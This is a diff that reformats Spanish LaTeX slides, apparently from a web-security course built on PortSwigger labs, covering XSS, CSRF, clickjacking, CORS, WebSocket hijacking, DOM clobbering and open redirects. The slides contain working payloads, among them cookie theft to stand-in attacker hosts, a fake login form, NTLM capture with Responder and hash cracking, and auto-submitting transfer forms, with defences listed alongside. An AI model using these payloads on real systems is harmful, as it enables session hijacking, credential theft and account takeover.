@@ -1825,7 +1825,7 @@
   \begin{itemize}
   \item Vulnerabilidades Web
   \item Bypass de validaciones basadas en startswith/contains
-  \item \cmd{\# Si la app valida que la URL empiece por el dominio legítimo:}
+  \item[] \cmdbox{Si la app valida que la URL empiece por el dominio legítimo:}
   \item https://victima.com.attacker.com (subdominio del atacante)
   \item https://victima.com@attacker.com (@ separa user:pass del host)
   \item //attacker.com (protocol-relative URL)
@@ -1835,7 +1835,7 @@
   \item https://attacker\%2Ecom (punto URL-encoded)
   \item https://attacker\textbackslash\{\}.com (backslash confunde parsers)
   \item Account Takeover vía OAuth + Open Redirect
-  \item \cmd{\# Si el servidor OAuth valida redirect\_uri como 'startswith':}
+  \item[] \cmdbox{Si el servidor OAuth valida redirect\_uri como 'startswith':}
   \item GET /oauth/authorize?client\_id=X
   \item \&redirect\_uri=https://victima.com/cb/../../../attacker.com
   \item $\rightarrow$ Path traversal en la URL $\rightarrow$ el authorization code llega al atacante
@@ -1954,13 +1954,13 @@
   \item Protocolo full-duplex sobre TCP: mantiene una conexión persistente
   \item entre cliente y servidor. Usado en chats, dashboards, notificaciones, juegos.
   \item Handshake de apertura WebSocket
-  \item \cmd{\# El cliente envía (HTTP Upgrade):}
+  \item[] \cmdbox{El cliente envía (HTTP Upgrade):}
   \item GET /chat HTTP/1.1
   \item Upgrade: websocket
   \item Connection: Upgrade
   \item Sec-WebSocket-Key: BASE64\_RANDOM==
-  \item \cmd{\# El servidor confirma: 101 Switching Protocols}
-  \item \cmd{\# A partir de aquí: comunicación binaria bidireccional}
+  \item[] \cmdbox{El servidor confirma: 101 Switching Protocols\\{}
+A partir de aquí: comunicación binaria bidireccional}
   \item Interceptar WebSockets con Burp Suite
   \item Proxy $\rightarrow$ WebSockets History: muestra todos los mensajes WS enviados/recibidos
   \item Clic derecho en un mensaje $\rightarrow$ Send to Repeater
@@ -1986,7 +1986,7 @@
   \item 2. El servidor autentica usando solo las cookies de sesión
   \item 3. El servidor no valida el header Origin del handshake
   \item Payload CSWSH (página del atacante)
-  \item \cmd{\# HTML en el servidor del atacante:}
+  \item[] \cmdbox{HTML en el servidor del atacante:}
   \item \textless{}script\textgreater{}
   \item var ws = new WebSocket('wss://victima.com/chat');
   \item ws.onopen = () =\textgreater{} ws.send(JSON.stringify(\{action:'get\_history'\}));
@@ -2103,9 +2103,9 @@
   \item Vulnerabilidad --- Reflexión del origen sin validación (Labs 92-93)
   \item El servidor toma el valor del header Origin de la petición y lo devuelve tal cual en ACAO.
   \item Resultado: cualquier origen puede leer la respuesta, incluidos datos sensibles.
-  \item \cmd{\# Petición del atacante:}
+  \item[] \cmdbox{Petición del atacante:}
   \item \cmd{Origin: https://attacker.com}
-  \item \cmd{\# Respuesta del servidor vulnerable:}
+  \item[] \cmdbox{Respuesta del servidor vulnerable:}
   \item \cmd{Access-Control-Allow-Origin: https://attacker.com}
   \item \cmd{Access-Control-Allow-Credentials: true}
   \item Código del ataque (Lab 92)
@@ -2236,8 +2236,8 @@
   \item El payload viaja en la petición HTTP y el servidor lo devuelve en la respuesta
   \item sin sanitizarlo. No se almacena --- requiere engañar a la víctima con un enlace.
   \item Ejemplo clásico --- parámetro de búsqueda (Lab 27)
-  \item \cmd{\# GET /search?q=\textless{}script\textgreater{}alert(document.cookie)\textless{}/script\textgreater{}}
-  \item \cmd{\# Respuesta: \textless{}p\textgreater{}Resultados para: \textless{}script\textgreater{}alert(...)\textless{}/script\textgreater{}\textless{}/p\textgreater{}}
+  \item[] \cmdbox{GET /search?q=\textless{}script\textgreater{}alert(document.cookie)\textless{}/script\textgreater{}\\{}
+Respuesta: \textless{}p\textgreater{}Resultados para: \textless{}script\textgreater{}alert(...)\textless{}/script\textgreater{}\textless{}/p\textgreater{}}
   \item Contextos de inyección
   \item En HTML: \textless{}script\textgreater{}alert(1)\textless{}/script\textgreater{}
   \item En atributo: \textquotedbl{} onmouseover=\textquotedbl{}alert(1)
@@ -2262,12 +2262,12 @@
   \item Comentarios / foros $\cdot$ Campos de perfil $\cdot$ Mensajes privados
   \item Metadatos de ficheros subidos $\cdot$ Paneles de administración
   \item Ejemplo --- robo de cookies masivo (Lab 28)
-  \item \cmd{\# Comentario: \textless{}script\textgreater{}}
-  \item \cmd{\# fetch('https://attacker/steal?c='+document.cookie);}
-  \item \cmd{\# \textless{}/script\textgreater{}}
+  \item[] \cmdbox{Comentario: \textless{}script\textgreater{}\\{}
+fetch('https://attacker/steal?c='+document.cookie);\\{}
+\textless{}/script\textgreater{}}
   \item $\rightarrow$ Todos los visitantes ejecutan el fetch al ver la página
   \item Almacenado en href (Lab 34)
-  \item \cmd{\# \textless{}a href=\textquotedbl{}javascript:alert(document.cookie)\textquotedbl{}\textgreater{}Haz clic\textless{}/a\textgreater{}}
+  \item[] \cmdbox{\textless{}a href=\textquotedbl{}javascript:alert(document.cookie)\textquotedbl{}\textgreater{}Haz clic\textless{}/a\textgreater{}}
   \item $\rightarrow$ Las comillas están HTML-encoded pero el href javascript: funciona igual
   \item Labs PortSwigger --- almacenado
   \item Lab 28: en HTML $\cdot$ Lab 34: en href $\cdot$ Lab 38: DOM almacenado
@@ -2292,8 +2292,8 @@
   \item element.href / element.src / window.location
   \item jQuery: \$() $\cdot$ .html() $\cdot$ .attr()
   \item Patrón vulnerable típico
-  \item \cmd{\# var search = location.search.substring(1);}
-  \item \cmd{\# document.write('\textless{}img src=\textquotedbl{}/img/' + search + '\textquotedbl{}\textgreater{}');}
+  \item[] \cmdbox{var search = location.search.substring(1);\\{}
+document.write('\textless{}img src=\textquotedbl{}/img/' + search + '\textquotedbl{}\textgreater{}');}
   \item Payload: ?\textless{}img src=x onerror=alert(1)\textgreater{}
   \item portswigger.net/web-security/cross-site-scripting/dom-based
   \end{itemize}
@@ -2304,19 +2304,19 @@
   \begin{itemize}
   \item Cross-Site Scripting (XSS)
   \item Lab 29 --- document.write + location.search
-  \item \cmd{\# document.write('\textless{}img src=\textquotedbl{}/img/' + decodeURIComponent(search) + '\textquotedbl{}\textgreater{}');}
+  \item[] \cmdbox{document.write('\textless{}img src=\textquotedbl{}/img/' + decodeURIComponent(search) + '\textquotedbl{}\textgreater{}');}
   \item Payload: ?q=\textquotedbl{}\textgreater{}\textless{}svg onload=alert(1)\textgreater{}
   \item Lab 30 --- innerHTML + location.search
   \item innerHTML NO ejecuta \textless{}script\textgreater{} pero sí event handlers en otras etiquetas
   \item Payload: ?q=\textless{}img src=1 onerror=alert(document.cookie)\textgreater{}
   \item Lab 31 --- href + jQuery + location.search
-  \item \cmd{\# \$('\#backLink').attr('href', (new URLSearchParams(search)).get('returnUrl'));}
+  \item[] \cmdbox{\$('\#backLink').attr('href', (new URLSearchParams(search)).get('returnUrl'));}
   \item Payload: ?returnUrl=javascript:alert(document.cookie)
   \item Lab 32 --- jQuery + evento hashchange
-  \item \cmd{\# \$(window).on('hashchange', function() \{}
-  \item \cmd{\# var post = \$(location.hash); // selector = contenido del hash}
-  \item \cmd{\# \$('html, body').animate(\{scrollTop: post.offset().top\}, 'fast');}
-  \item \cmd{\# \});}
+  \item[] \cmdbox{\$(window).on('hashchange', function() \{\\{}
+var post = \$(location.hash); // selector = contenido del hash\\{}
+\$('html, body').animate(\{scrollTop: post.offset().top\}, 'fast');\\{}
+\});}
   \item Payload desde iframe: src+='\#\textless{}img src=x onerror=alert(1)\textgreater{}'
   \end{itemize}
 \end{frame}
@@ -2331,7 +2331,7 @@
   \item $\rightarrow$ Escapa el sandbox de AngularJS para ejecutar código arbitrario
   \item Lab 37 --- DOM reflejado (Reflected DOM XSS)
   \item Servidor refleja datos en JSON que el JS del cliente evalúa con eval():
-  \item \cmd{\# eval('var searchResultsObj = ' + responseData);}
+  \item[] \cmdbox{eval('var searchResultsObj = ' + responseData);}
   \item Payload: \textbackslash\{\}\textquotedbl{}-alert(1)\}// (cierra el JSON e inyecta alert)
   \item Lab 38 --- DOM almacenado (Stored DOM XSS)
   \item Filtro de la app elimina \textless{}script\textgreater{} pero sink es innerHTML:
@@ -2479,8 +2479,8 @@
   \item AngularJS sandbox escape + CSP (Lab 53)
   \item CSP bloquea inline scripts pero AngularJS evalúa \{\{\}\} sin \textless{}script\textgreater{}
   \item Escape sin strings:
-  \item \cmd{\# toString().constructor.prototype.charAt=[].join;}
-  \item \cmd{\# [1]|orderBy:'toString().constructor.fromCharCode(120,115,115)'}
+  \item[] \cmdbox{toString().constructor.prototype.charAt=[].join;\\{}
+[1]|orderBy:'toString().constructor.fromCharCode(120,115,115)'}
   \item Dangling markup con CSP estricto (Labs 57-59)
   \item \textless{}img src=\textquotedbl{}https://attacker/?data=
   \item $\rightarrow$ Captura el HTML siguiente hasta la próxima comilla
@@ -2495,16 +2495,16 @@
   \begin{itemize}
   \item Cross-Site Scripting (XSS)
   \item Defacement mediante XSS
-  \item \cmd{\# document.body.innerHTML = '\textless{}h1 style=\textquotedbl{}color:red\textquotedbl{}\textgreater{}Hacked!\textless{}/h1\textgreater{}';}
-  \item \cmd{\# document.title = 'Hacked';}
-  \item \cmd{\# document.body.style.backgroundImage = 'url(https://attacker/img.png)';}
+  \item[] \cmdbox{document.body.innerHTML = '\textless{}h1 style=\textquotedbl{}color:red\textquotedbl{}\textgreater{}Hacked!\textless{}/h1\textgreater{}';\\{}
+document.title = 'Hacked';\\{}
+document.body.style.backgroundImage = 'url(https://attacker/img.png)';}
   \item Phishing vía XSS --- Fake Login
   \item Inyectar formulario de login falso sobre la página legítima:
-  \item \cmd{\# document.body.innerHTML = `}
-  \item \cmd{\# \textless{}form action='https://attacker.com/steal' method=POST\textgreater{}}
-  \item \cmd{\# \textless{}h2\textgreater{}Sesión expirada. Inicia sesión de nuevo:\textless{}/h2\textgreater{}}
-  \item \cmd{\# \textless{}input name=user\textgreater{}\textless{}input type=password name=pass\textgreater{}}
-  \item \cmd{\# \textless{}button\textgreater{}Entrar\textless{}/button\textgreater{}\textless{}/form\textgreater{}`;}
+  \item[] \cmdbox{document.body.innerHTML = `\\{}
+\textless{}form action='https://attacker.com/steal' method=POST\textgreater{}\\{}
+\textless{}h2\textgreater{}Sesión expirada. Inicia sesión de nuevo:\textless{}/h2\textgreater{}\\{}
+\textless{}input name=user\textgreater{}\textless{}input type=password name=pass\textgreater{}\\{}
+\textless{}button\textgreater{}Entrar\textless{}/button\textgreater{}\textless{}/form\textgreater{}`;}
   \item $\rightarrow$ La víctima ve la URL legítima pero envía credenciales al atacante
   \item Watering Hole
   \item Comprometer un sitio frecuentado por el objetivo
@@ -2522,9 +2522,9 @@
   \item RCE en aplicaciones Electron
   \item Electron = apps de escritorio con Chromium + Node.js.
   \item Si nodeIntegration=true y contextIsolation=false $\rightarrow$ XSS da RCE:
-  \item \cmd{\# require('child\_process').exec('calc.exe'); // Windows}
-  \item \cmd{\# require('child\_process').exec('open /Applications/Calculator.app');}
-  \item \cmd{\# require('child\_process').execSync('id').toString(); // Linux/macOS}
+  \item[] \cmdbox{require('child\_process').exec('calc.exe'); // Windows\\{}
+require('child\_process').exec('open /Applications/Calculator.app');\\{}
+require('child\_process').execSync('id').toString(); // Linux/macOS}
   \item Condiciones necesarias
   \item nodeIntegration: true (renderer puede usar require())
   \item contextIsolation: false (renderer comparte contexto con Node.js)
@@ -2544,21 +2544,21 @@
   \begin{itemize}
   \item Cross-Site Scripting (XSS)
   \item Session Hijacking --- robo de cookies (Lab 47)
-  \item \cmd{\# \textless{}script\textgreater{}}
-  \item \cmd{\# new Image().src='https://attacker/steal?c='+encodeURIComponent(document.cookie);}
-  \item \cmd{\# \textless{}/script\textgreater{}}
+  \item[] \cmdbox{\textless{}script\textgreater{}\\{}
+new Image().src='https://attacker/steal?c='+encodeURIComponent(document.cookie);\\{}
+\textless{}/script\textgreater{}}
   \item Alternativa sin fetch (bypassa algunos WAF)
-  \item \cmd{\# \textless{}img src=x onerror=\textquotedbl{}this.src='https://attacker/c?'+document.cookie\textquotedbl{}\textgreater{}}
+  \item[] \cmdbox{\textless{}img src=x onerror=\textquotedbl{}this.src='https://attacker/c?'+document.cookie\textquotedbl{}\textgreater{}}
   \item HttpOnly --- mitigación y límites
   \item Cookies con HttpOnly: document.cookie no las expone
   \item Bypass: no se roba la cookie, pero se usa la sesión activa:
-  \item \cmd{\# fetch('/transfer',\{method:'POST',credentials:'include',}
-  \item \cmd{\# body:'amount=9999\&to=attacker',}
-  \item \cmd{\# headers:\{'Content-Type':'application/x-www-form-urlencoded'\}\})}
+  \item[] \cmdbox{fetch('/transfer',\{method:'POST',credentials:'include',\\{}
+body:'amount=9999\&to=attacker',\\{}
+headers:\{'Content-Type':'application/x-www-form-urlencoded'\}\})}
   \item Captura de contraseñas con gestor (Lab 48)
-  \item \cmd{\# \textless{}input name=username\textgreater{} \textless{}!-- gestor de contraseñas rellena --\textgreater{}}
-  \item \cmd{\# \textless{}input type=password name=password}
-  \item \cmd{\# onchange=\textquotedbl{}fetch('/log?p='+this.value)\textquotedbl{}\textgreater{}}
+  \item[] \cmdbox{\textless{}input name=username\textgreater{} \textless{}!-- gestor de contraseñas rellena --\textgreater{}\\{}
+\textless{}input type=password name=password\\{}
+onchange=\textquotedbl{}fetch('/log?p='+this.value)\textquotedbl{}\textgreater{}}
   \item Defensa
   \item HttpOnly + Secure + SameSite=Strict en cookies
   \item CSP: script-src 'nonce-...' (sin unsafe-inline)
@@ -2573,15 +2573,15 @@
   \item En redes Windows con IE/Edge Legacy, el navegador intenta autenticarse
   \item automáticamente con credenciales NTLM al acceder a recursos UNC.
   \item Payload XSS para forzar autenticación NTLM
-  \item \cmd{\# \textless{}img src=\textquotedbl{}\textbackslash\{\}\textbackslash\{\}\textbackslash\{\}\textbackslash\{\}ATTACKER\_IP\textbackslash\{\}\textbackslash\{\}x\textquotedbl{}\textgreater{}}
-  \item \cmd{\# \textless{}script\textgreater{}document.location='\textbackslash\{\}\textbackslash\{\}\textbackslash\{\}\textbackslash\{\}ATTACKER\_IP\textbackslash\{\}\textbackslash\{\}x'\textless{}/script\textgreater{}}
-  \item \cmd{\# \textless{}link rel=\textquotedbl{}stylesheet\textquotedbl{} href=\textquotedbl{}\textbackslash\{\}\textbackslash\{\}\textbackslash\{\}\textbackslash\{\}ATTACKER\_IP\textbackslash\{\}\textbackslash\{\}x\textquotedbl{}\textgreater{}}
+  \item[] \cmdbox{\textless{}img src=\textquotedbl{}\textbackslash\{\}\textbackslash\{\}\textbackslash\{\}\textbackslash\{\}ATTACKER\_IP\textbackslash\{\}\textbackslash\{\}x\textquotedbl{}\textgreater{}\\{}
+\textless{}script\textgreater{}document.location='\textbackslash\{\}\textbackslash\{\}\textbackslash\{\}\textbackslash\{\}ATTACKER\_IP\textbackslash\{\}\textbackslash\{\}x'\textless{}/script\textgreater{}\\{}
+\textless{}link rel=\textquotedbl{}stylesheet\textquotedbl{} href=\textquotedbl{}\textbackslash\{\}\textbackslash\{\}\textbackslash\{\}\textbackslash\{\}ATTACKER\_IP\textbackslash\{\}\textbackslash\{\}x\textquotedbl{}\textgreater{}}
   \item Captura con Responder
-  \item \cmd{\# python3 Responder.py -I eth0 -wPv}
+  \item[] \cmdbox{python3 Responder.py -I eth0 -wPv}
   \item $\rightarrow$ Captura el hash NTLMv2 enviado por el navegador de la víctima
   \item Crackeo del hash
-  \item \cmd{\# hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt}
-  \item \cmd{\# john --format=netntlmv2 ntlmv2.txt --wordlist=rockyou.txt}
+  \item[] \cmdbox{hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt\\{}
+john --format=netntlmv2 ntlmv2.txt --wordlist=rockyou.txt}
   \item Condiciones necesarias
   \item Víctima en red corporativa Windows con IE/Edge Legacy
   \item XSS almacenado (afecta a múltiples víctimas)
@@ -2596,15 +2596,15 @@
   \item Cross-Site Scripting (XSS)
   \item Si la app sirve ficheros subidos en el mismo origen $\rightarrow$ XSS
   \item SVG con script embebido
-  \item \cmd{\# \textless{}svg xmlns=\textquotedbl{}http://www.w3.org/2000/svg\textquotedbl{}\textgreater{}}
-  \item \cmd{\# \textless{}script\textgreater{}alert(document.domain+': '+document.cookie)\textless{}/script\textgreater{}}
-  \item \cmd{\# \textless{}/svg\textgreater{}}
+  \item[] \cmdbox{\textless{}svg xmlns=\textquotedbl{}http://www.w3.org/2000/svg\textquotedbl{}\textgreater{}\\{}
+\textless{}script\textgreater{}alert(document.domain+': '+document.cookie)\textless{}/script\textgreater{}\\{}
+\textless{}/svg\textgreater{}}
   \item $\rightarrow$ Subir como .svg y acceder a la URL directa del fichero
   \item HTML upload
   \item Si se permiten .html / .htm $\rightarrow$ HTML con \textless{}script\textgreater{} completo
   \item Mismo origen $\rightarrow$ cookies accesibles
   \item Metadata EXIF en imágenes
-  \item \cmd{\# exiftool -DocumentName='\textless{}script\textgreater{}alert(1)\textless{}/script\textgreater{}' imagen.jpg}
+  \item[] \cmdbox{exiftool -DocumentName='\textless{}script\textgreater{}alert(1)\textless{}/script\textgreater{}' imagen.jpg}
   \item $\rightarrow$ Si la galería renderiza metadatos sin sanitizar
   \item SVG en \textless{}img\textgreater{} vs URL directa
   \item \textless{}img src=file.svg\textgreater{} $\rightarrow$ NO ejecuta scripts (sandboxed)
@@ -2684,11 +2684,11 @@
   \item La acción tiene efectos (transferir, cambiar email, borrar cuenta...)
   \item Los parámetros son predecibles y sin token CSRF validado
   \item Ejemplo básico (Lab 61)
-  \item \cmd{\# \textless{}form action='https://bank.com/transfer' method='POST'\textgreater{}}
-  \item \cmd{\# \textless{}input type=hidden name=amount value=5000\textgreater{}}
-  \item \cmd{\# \textless{}input type=hidden name=to value=attacker\_account\textgreater{}}
-  \item \cmd{\# \textless{}/form\textgreater{}}
-  \item \cmd{\# \textless{}script\textgreater{}document.forms[0].submit();\textless{}/script\textgreater{}}
+  \item[] \cmdbox{\textless{}form action='https://bank.com/transfer' method='POST'\textgreater{}\\{}
+\textless{}input type=hidden name=amount value=5000\textgreater{}\\{}
+\textless{}input type=hidden name=to value=attacker\_account\textgreater{}\\{}
+\textless{}/form\textgreater{}\\{}
+\textless{}script\textgreater{}document.forms[0].submit();\textless{}/script\textgreater{}}
   \item $\rightarrow$ La víctima visita la página atacante $\rightarrow$ formulario enviado automáticamente
   \item OWASP Top 10 2021: A01 --- Broken Access Control
   \item CWE-352: Cross-Site Request Forgery
@@ -2704,7 +2704,7 @@
   \item Construir formulario + auto-submit (Burp $\rightarrow$ Generate CSRF PoC)
   \item Lab 62 --- Token validado solo en POST
   \item Bypass: cambiar método a GET
-  \item \cmd{\# \textless{}img src='https://victim.com/email?email=att@evil.com'\textgreater{}}
+  \item[] \cmdbox{\textless{}img src='https://victim.com/email?email=att@evil.com'\textgreater{}}
   \item Lab 63 --- Validación solo si el token existe
   \item Omitir completamente el campo csrf $\rightarrow$ el servidor no valida nada
   \item Lab 64 --- Token no vinculado a la sesión
@@ -2755,7 +2755,7 @@
   \item Chrome $\geq$80: SameSite=Lax por defecto si no se especifica
   \item Lab 68 --- Bypass SameSite Lax con method override
   \item POST bloqueado; frameworks como Laravel aceptan \_method=POST en GET:
-  \item \cmd{\# GET /change-email?email=x\&\_method=POST}
+  \item[] \cmdbox{GET /change-email?email=x\&\_method=POST}
   \item Lab 69 --- SameSite Strict con redirección cliente
   \item Petición originada en el propio sitio (same-site) sí lleva la cookie
   \item Explotar open redirect en la app víctima
@@ -2835,20 +2835,20 @@
   \item CSRF
   \item Lab 73 --- Validación Referer solo si existe
   \item Suprimir el Referer con meta tag:
-  \item \cmd{\# \textless{}meta name=referrer content=no-referrer\textgreater{}}
+  \item[] \cmdbox{\textless{}meta name=referrer content=no-referrer\textgreater{}}
   \item Lab 74 --- Validación Referer insuficiente
   \item El servidor comprueba que el Referer contiene el dominio legítimo
   \item Bypass (la URL del atacante contiene el dominio como subdirectorio/param):
-  \item \cmd{\# https://victim.com.attacker.com/exploit}
-  \item \cmd{\# https://attacker.com/exploit?victim.com}
+  \item[] \cmdbox{https://victim.com.attacker.com/exploit\\{}
+https://attacker.com/exploit?victim.com}
   \item CSRF + XSS --- evasión total (Labs 49-50)
   \item XSS en el mismo origen permite leer el token CSRF del DOM:
-  \item \cmd{\# fetch('/settings').then(r=\textgreater{}r.text()).then(html=\textgreater{}\{}
-  \item \cmd{\# const t = html.match(/name=.csrf. value=.(\textbackslash\{\}w+)/)[1];}
-  \item \cmd{\# fetch('/email/change',\{method:'POST',credentials:'include',}
-  \item \cmd{\# body:'csrf='+t+'\&email=attacker@evil.com',}
-  \item \cmd{\# headers:\{'Content-Type':'application/x-www-form-urlencoded'\}\})}
-  \item \cmd{\# \});}
+  \item[] \cmdbox{fetch('/settings').then(r=\textgreater{}r.text()).then(html=\textgreater{}\{\\{}
+const t = html.match(/name=.csrf. value=.(\textbackslash\{\}w+)/)[1];\\{}
+fetch('/email/change',\{method:'POST',credentials:'include',\\{}
+body:'csrf='+t+'\&email=attacker@evil.com',\\{}
+headers:\{'Content-Type':'application/x-www-form-urlencoded'\}\})\\{}
+\});}
   \item Defensa completa recomendada
   \item Token CSRF sincronizado + SameSite=Strict + verificar Origin/Referer
   \end{itemize}
@@ -2888,12 +2888,12 @@
   \item La víctima hace clic creyendo interactuar con el señuelo, pero en realidad
   \item está activando una acción sensible en la página víctima.
   \item Código básico de ataque
-  \item \cmd{\# \textless{}style\textgreater{}}
-  \item \cmd{\# \#victim \{ opacity:0.00001; position:absolute; top:300px; left:200px; \}}
-  \item \cmd{\# \#decoy \{ position:absolute; top:300px; left:200px; \}}
-  \item \cmd{\# \textless{}/style\textgreater{}}
-  \item \cmd{\# \textless{}div id=decoy\textgreater{}¡Gana un iPhone! CLICK AQUÍ\textless{}/div\textgreater{}}
-  \item \cmd{\# \textless{}iframe id=victim src='https://bank.com/account/delete'\textgreater{}\textless{}/iframe\textgreater{}}
+  \item[] \cmdbox{\textless{}style\textgreater{}\\{}
+\#victim \{ opacity:0.00001; position:absolute; top:300px; left:200px; \}\\{}
+\#decoy \{ position:absolute; top:300px; left:200px; \}\\{}
+\textless{}/style\textgreater{}\\{}
+\textless{}div id=decoy\textgreater{}¡Gana un iPhone! CLICK AQUÍ\textless{}/div\textgreater{}\\{}
+\textless{}iframe id=victim src='https://bank.com/account/delete'\textgreater{}\textless{}/iframe\textgreater{}}
   \item Acciones típicas abusadas
   \item Borrar cuenta $\cdot$ Cambiar email/contraseña $\cdot$ Autorizar OAuth
   \item Transferencias $\cdot$ Habilitar cámara/micrófono
@@ -2915,12 +2915,12 @@
   \item Posicionar el botón 'Delete Account' bajo el señuelo usando top/left/margin
   \item El iframe incluye el token CSRF --- el clic lo envía legítimamente
   \item Lab 77 --- Datos precargados por parámetro GET
-  \item \cmd{\# /change-email?email=attacker@evil.com}
+  \item[] \cmdbox{/change-email?email=attacker@evil.com}
   \item El formulario ya tiene el email del atacante relleno; víctima solo confirma
   \item Lab 78 --- Bypass de frame-busting JS
   \item Código víctima: if (top != self) \{ top.location = self.location; \}
   \item Bypass: sandbox en el iframe bloquea el JS pero permite formularios:
-  \item \cmd{\# \textless{}iframe sandbox='allow-forms' src='https://victim.com/delete'\textgreater{}}
+  \item[] \cmdbox{\textless{}iframe sandbox='allow-forms' src='https://victim.com/delete'\textgreater{}}
   \item Lab 79 --- Clickjacking para explotar XSS DOM
   \item El clic activa un onfocus/onclick con payload XSS
   \item $\rightarrow$ Ejecución de JS en el origen de la víctima vía clickjacking
@@ -2942,7 +2942,7 @@
   \item Lab 79: Clickjacking para XSS DOM
   \item Lab 80: Multi-step clickjacking
   \item Detección rápida
-  \item \cmd{\# curl -sI https://victim.com/sensitive | grep -i 'x-frame\textbackslash\{\}|csp'}
+  \item[] \cmdbox{curl -sI https://victim.com/sensitive | grep -i 'x-frame\textbackslash\{\}|csp'}
   \item Sin X-Frame-Options ni CSP frame-ancestors $\rightarrow$ posiblemente vulnerable
   \item Notas importantes
   \item X-Frame-Options: no soporta whitelist de dominios (solo DENY/SAMEORIGIN)
@@ -2986,18 +2986,18 @@
   \item API HTML5 para comunicación entre ventanas/iframes de distintos orígenes.
   \item El receptor DEBE validar el origen --- si no lo hace, es vulnerable.
   \item Lab 82 --- XSS DOM con Web Messages (sin validación de origen)
-  \item \cmd{\# window.addEventListener('message', function(e) \{}
-  \item \cmd{\# document.getElementById('ads').innerHTML = e.data; // sink!}
-  \item \cmd{\# \});}
-  \item \cmd{\# Payload (iframe con onload):}
-  \item \cmd{\# \textless{}iframe src='https://victim.com'}
-  \item \cmd{\# onload='this.contentWindow.postMessage(\textquotedbl{}\textless{}img src=x onerror=alert(1)\textgreater{}\textquotedbl{},\textquotedbl{}*\textquotedbl{})'\textgreater{}}
+  \item[] \cmdbox{window.addEventListener('message', function(e) \{\\{}
+document.getElementById('ads').innerHTML = e.data; // sink!\\{}
+\});\\{}
+Payload (iframe con onload):\\{}
+\textless{}iframe src='https://victim.com'\\{}
+onload='this.contentWindow.postMessage(\textquotedbl{}\textless{}img src=x onerror=alert(1)\textgreater{}\textquotedbl{},\textquotedbl{}*\textquotedbl{})'\textgreater{}}
   \item Lab 83 --- postMessage con URL javascript:
-  \item \cmd{\# handler: element.href = e.data}
-  \item \cmd{\# Payload: postMessage('javascript:alert(1)', '*')}
+  \item[] \cmdbox{handler: element.href = e.data\\{}
+Payload: postMessage('javascript:alert(1)', '*')}
   \item Lab 84 --- postMessage con JSON.parse
-  \item \cmd{\# var data = JSON.parse(event.data); window.location = data.redirectUrl;}
-  \item \cmd{\# Payload: \{\textquotedbl{}redirectUrl\textquotedbl{}:\textquotedbl{}javascript:alert(1)\textquotedbl{}\}}
+  \item[] \cmdbox{var data = JSON.parse(event.data); window.location = data.redirectUrl;\\{}
+Payload: \{\textquotedbl{}redirectUrl\textquotedbl{}:\textquotedbl{}javascript:alert(1)\textquotedbl{}\}}
   \item Defensa
   \item Validar siempre: if (e.origin !== 'https://expected.com') return;
   \item No pasar datos de postMessage a sinks sin sanitizar
@@ -3010,8 +3010,8 @@
   \item Vulnerabilidades DOM
   \item Lab 85 --- Open Redirect basado en DOM
   \item JS construye URL de redirección desde location.search:
-  \item \cmd{\# var returnUrl = new URLSearchParams(location.search).get('returnUrl');}
-  \item \cmd{\# document.getElementById('backLink').href = returnUrl;}
+  \item[] \cmdbox{var returnUrl = new URLSearchParams(location.search).get('returnUrl');\\{}
+document.getElementById('backLink').href = returnUrl;}
   \item Payload: ?returnUrl=https://attacker.com
   \item Si sink es window.location: ?returnUrl=javascript:alert(1)
   \item Diferencia con open redirect server-side
@@ -3019,7 +3019,7 @@
   \item DOM-based: la redirección la ejecuta JS en el cliente
   \item $\rightarrow$ Misma peligrosidad para phishing; a veces más difícil de detectar
   \item Lab 86 --- Manipulación de cookies vía DOM
-  \item \cmd{\# document.cookie = 'language=' + location.search.split('lang=')[1];}
+  \item[] \cmdbox{document.cookie = 'language=' + location.search.split('lang=')[1];}
   \item Payload: ?lang=en; admin=true
   \item Si la cookie influye en seguridad $\rightarrow$ privilege escalation
   \item Para CSRF: forzar double-submit cookie con valor conocido
@@ -3035,20 +3035,20 @@
   \item Vulnerabilidades DOM
   \item ¿Qué es DOM Clobbering?
   \item Los elementos HTML con id o name se asignan automáticamente a window:
-  \item \cmd{\# \textless{}a id=config\textgreater{}\textless{}/a\textgreater{} $\rightarrow$ window.config = \textless{}a\textgreater{} element}
-  \item \cmd{\# \textless{}a id=cfg\textgreater{}\textless{}a id=cfg name=endpoint href='//attacker.com'\textgreater{}}
+  \item[] \cmdbox{\textless{}a id=config\textgreater{}\textless{}/a\textgreater{} $\rightarrow$ window.config = \textless{}a\textgreater{} element\\{}
+\textless{}a id=cfg\textgreater{}\textless{}a id=cfg name=endpoint href='//attacker.com'\textgreater{}}
   \item $\rightarrow$ cfg.endpoint.toString() = 'https://attacker.com'
   \item Labs 87-88 --- XSS mediante DOM Clobbering
   \item Código vulnerable:
-  \item \cmd{\# var cfg = window.cfg || \{\};}
-  \item \cmd{\# loadScript(cfg.endpoint); // si cfg es undefined, usa default seguro}
+  \item[] \cmdbox{var cfg = window.cfg || \{\};\\{}
+loadScript(cfg.endpoint); // si cfg es undefined, usa default seguro}
   \item Inyectando \textless{}a id=cfg href=//attacker.com/malicious.js\textgreater{}
   \item $\rightarrow$ cfg.endpoint = URL del atacante $\rightarrow$ loadScript la ejecuta
   \item Labs 89-90 --- Bypass de filtros HTML con DOM Clobbering
   \item Versiones antiguas de DOMPurify son vulnerables a clobbering
   \item de variables internas del sanitizador $\rightarrow$ bypass del filtro XSS
-  \item \cmd{\# \textless{}form id=x\textgreater{}\textless{}output id=x name=innerHTML\textgreater{}}
-  \item \cmd{\# \textless{}img src=x onerror=alert(1)\textgreater{}\textless{}/output\textgreater{}\textless{}/form\textgreater{}}
+  \item[] \cmdbox{\textless{}form id=x\textgreater{}\textless{}output id=x name=innerHTML\textgreater{}\\{}
+\textless{}img src=x onerror=alert(1)\textgreater{}\textless{}/output\textgreater{}\textless{}/form\textgreater{}}
   \item Defensa
   \item No confiar en propiedades globales de window que puedan ser clobbered
   \item Usar let/const en scope local en vez de window.x
